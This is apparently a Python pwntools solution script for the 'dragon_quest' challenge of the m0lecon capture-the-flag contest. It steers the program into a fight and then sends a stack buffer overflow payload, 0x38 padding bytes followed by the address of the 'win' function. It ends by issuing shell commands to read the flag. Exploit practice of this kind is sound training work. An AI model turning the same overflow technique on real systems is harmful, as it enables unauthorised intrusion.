#!/usr/bin/env python3
from pwn import *

HOST = "dragonquest.challs.m0lecon.it"
PORT = 5555

exe = context.binary = ELF("./dragon_quest", checksec=False)
context.log_level = "info"

SPELLS = [
    (b"s0", 1999),
    (b"s1", 1999),
    (b"s2", 1999),
    (b"s3", 333),
    (b"s4", 333),
]
OFFSET = 0x38
WIN_ADDR = exe.symbols["win"]


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(exe.path)


def learn(io, name: bytes, dmg: int) -> None:
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"chars): ", name)
    io.sendlineafter(b"(1-1999): ", str(dmg).encode())


def fight(io) -> None:
    io.sendlineafter(b"> ", b"4")
    for idx in range(5):
        io.sendlineafter(b"Pick index > ", str(idx).encode())


def exploit(io):
    for name, dmg in SPELLS:
        learn(io, name, dmg)
    fight(io)
    payload = b"A" * OFFSET + p64(WIN_ADDR)
    io.sendlineafter(b"final taunt: ", payload)
    for cmd in (b"cat flag", b"cat flag.txt", b"cat /flag", b"ls", b"exit"):
        io.sendline(cmd)
    try:
        data = io.recvall(timeout=5)
    except EOFError:
        data = b""
    print(data.decode(errors="replace"))


def main():
    io = start()
    exploit(io)


if __name__ == "__main__":
    main()
